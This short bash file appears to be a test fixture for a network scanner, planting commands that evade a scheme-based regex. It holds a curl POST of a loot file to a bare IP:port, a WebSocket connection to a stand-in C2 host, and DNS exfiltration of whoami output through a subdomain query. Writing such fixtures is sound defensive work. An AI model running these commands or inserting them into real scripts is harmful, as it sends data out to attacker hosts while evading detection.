#!/usr/bin/env bash
# Planted evasion: network destinations that dodge the old https?:// regex.
# Should be caught by scan_network.sh's IP:port, ws://, and DNS-tool passes.

# Bare IP:port, no scheme.
curl -X POST --data @/tmp/loot 203.0.113.7:8443/collect

# WebSocket scheme.
wscat -c ws://c2.evasion-host.example:9001

# DNS-based exfiltration: data smuggled in a subdomain query.
dig "$(whoami).exfil.attacker-dns.example" TXT
